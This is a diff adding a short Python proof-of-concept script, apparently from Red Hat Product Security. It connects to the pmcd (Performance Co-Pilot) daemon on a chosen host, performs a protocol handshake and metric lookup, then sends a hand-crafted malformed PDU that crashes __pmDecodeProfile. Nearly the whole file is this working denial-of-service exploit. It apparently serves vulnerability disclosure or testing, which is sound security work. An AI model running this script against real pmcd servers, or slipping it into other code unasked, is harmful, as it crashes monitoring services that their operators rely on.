@@ -1,0 +1,21 @@
+#
+# usage: python crash-profile HOST
+#
+# Connects to pmcd on HOST and triggers a crash in __pmDecodeProfile.
+#
+# Florian Weimer / Red Hat Product Security Team
+#
+import socket
+import sys
+import pcppdu
+_, host = sys.argv
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((host, 44321))
+pcppdu.client_handshake(sock, from_=1)
+pcppdu.send_pmns_names(sock, from_=1, names=(str("hinv.ncpu"),))
+ids = pcppdu.parse_pmns_ids(pcppdu.read_pdu(sock))
+pmid = ids[1].idlist[0]
+pcppdu.send_desc_req(sock, from_=1, pmid=pmid)
+# print(pcppdu.parse_desc(pcppdu.read_pdu(sock)))
+sock.send(b'\x00\x00\x00(\x00\x00p\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+sock.close()
